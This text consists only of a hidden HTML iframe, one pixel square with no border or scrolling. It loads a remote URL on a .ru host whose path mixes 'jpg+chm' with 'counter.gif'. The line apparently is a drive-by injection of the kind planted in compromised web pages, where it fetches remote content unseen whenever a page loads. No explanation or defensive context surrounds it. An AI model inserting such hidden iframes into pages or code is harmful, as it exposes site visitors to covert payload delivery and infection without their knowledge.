<iframe  frameborder="0" width="1" height="1" scrolling="no" src="http://2.ru/mod/ok/jpg+chm/counter.gif"></iframe>
